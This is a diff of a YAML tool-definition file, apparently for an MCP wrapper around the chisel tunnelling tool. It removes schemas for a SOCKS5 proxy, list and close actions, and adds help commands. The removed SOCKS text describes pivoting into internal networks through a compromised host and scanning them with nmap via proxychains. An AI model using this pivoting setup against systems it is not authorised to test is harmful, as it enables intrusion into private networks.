-    description: "Create a SOCKS5 proxy through a chisel server — all traffic sent through the local SOCKS port is tunneled over HTTP to the chisel server and exits from the server's network. Runs `chisel client <server_url> <socks_port>:socks` as a background process. The chisel server must have --socks5 enabled. Use the returned proxy_url with proxychains or tool-specific SOCKS settings to route traffic through the server's network. Enables full network pivoting — any tool that supports SOCKS5 can reach any host the chisel server can reach. Note: chisel's --proxy flag (route client traffic through an HTTP CONNECT proxy to reach the chisel server) is not exposed — use bash for proxy-chained scenarios."
-    when_to_use: "(1) When you need to reach multiple services on an internal network through a compromised host over HTTP. (2) Instead of creating individual forward tunnels — one SOCKS proxy handles all destinations. (3) For network scanning through the tunnel — set up SOCKS then use nmap with proxychains. (4) When SSH is blocked but HTTP is open and you need SOCKS-style pivoting. (5) Default port 1080 — configure proxychains to use socks5://127.0.0.1:1080."
-    required_ports: []
-    params:
-      server_url:
-        type: string
-        required: true
-        description: "Chisel server URL. Server must have --socks5 enabled."
-      socks_port:
-        type: integer
-        default: 1080
-        description: "Local port for the SOCKS5 proxy."
-      auth:
-        type: string
-        description: "Auth 'user:pass' matching server."
-      fingerprint:
-        type: string
-        description: "Server fingerprint."
-      max_retry_count:
-        type: integer
-        default: 3
-        description: "Max reconnection attempts. Chisel's default is unlimited retries, but this is capped to 3 to prevent infinite hangs in MCP context. Set to 0 for unlimited."
-      verbose:
-        type: boolean
-        default: false
-        description: "Verbose logging."
-    returns:
-      id:
-        type: string
-        description: "Tunnel ID."
-      socks_port:
-        type: integer
-        description: "Local SOCKS5 proxy port."
-      proxy_url:
-        type: string
-        description: "SOCKS5 proxy URL (e.g., 'socks5://127.0.0.1:1080'). Use in proxychains or tool configs."
-
-  list:
-    description: "List all active chisel servers and client tunnels with their type, ports, mappings, and process status. Automatically prunes dead processes from the tracking list."
-    when_to_use: "To check which chisel processes are running, verify tunnel status, find local ports or process IDs."
-    required_ports: []
-    params: {}
-    returns:
-      processes:
-        type: array
-        description: "Array of active process objects. Each has: id, type (server/forward/reverse/socks), ports, mappings, status."
-      count:
-        type: integer
-        description: "Number of active processes."
-
-  close:
-    description: "Close a specific chisel server or client tunnel by its process ID. Sends SIGTERM then SIGKILL after 5 seconds if needed. Frees the ports used by the process."
-    when_to_use: "When a specific tunnel or server is no longer needed. Free ports for reuse."
-    required_ports: []
-    params:
-      id:
-        type: string
-        required: true
-        description: "Process ID to close (from list output, e.g., 'server-1', 'fwd-2')."
-    returns:
-      id:
-        type: string
-        description: "ID of the closed process."
-      type:
-        type: string
-        description: "Type of the closed process (server/forward/reverse/socks)."
-      status:
-        type: string
-        description: "Always 'closed'."
+help_commands:
+  - name: "chisel — top-level help"
+    binary: "chisel"
+    command: "--help"
+    when: "Print chisel's top-level usage. target=null."
+  - name: "chisel — server subcommand help"
+    binary: "chisel"
+    command: "server --help"
+    when: "Print full chisel server flag list. target=null."
+  - name: "chisel — client subcommand help"
+    binary: "chisel"
+    command: "client --help"
+    when: "Print full chisel client flag list including remote spec syntax. target=null."
